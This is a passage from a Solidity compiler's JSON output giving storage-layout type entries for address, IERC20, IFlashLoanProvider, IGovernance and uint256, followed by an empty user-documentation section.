						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_contract(IERC20)26": {
						"encoding": "inplace",
						"label": "contract IERC20",
						"numberOfBytes": "20"
					},
					"t_contract(IFlashLoanProvider)7": {
						"encoding": "inplace",
						"label": "contract IFlashLoanProvider",
						"numberOfBytes": "20"
					},
					"t_contract(IGovernance)39": {
						"encoding": "inplace",
						"label": "contract IGovernance",
						"numberOfBytes": "20"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}